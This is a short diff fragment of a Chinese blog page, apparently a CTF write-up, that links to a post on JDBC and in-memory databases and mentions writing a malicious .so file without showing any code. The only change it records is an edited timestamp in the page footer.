 <p><a target="_blank" rel="noopener" href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></p>
 <p>参考它可以先写一个恶意的so，<strong>类似</strong>下面这个形式<span class="blur">脑测太麻烦了，到时候更新正式wp的时候再改</span></p>
@@ -585,7 +585,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-05-20T14:41:13.142Z" itemprop="dateModified">最后编辑：2024-05-20</time>
+                    <time datetime="2024-05-20T14:41:47.361Z" itemprop="dateModified">最后编辑：2024-05-20</time>
                 </div>
             </div>
         </footer>
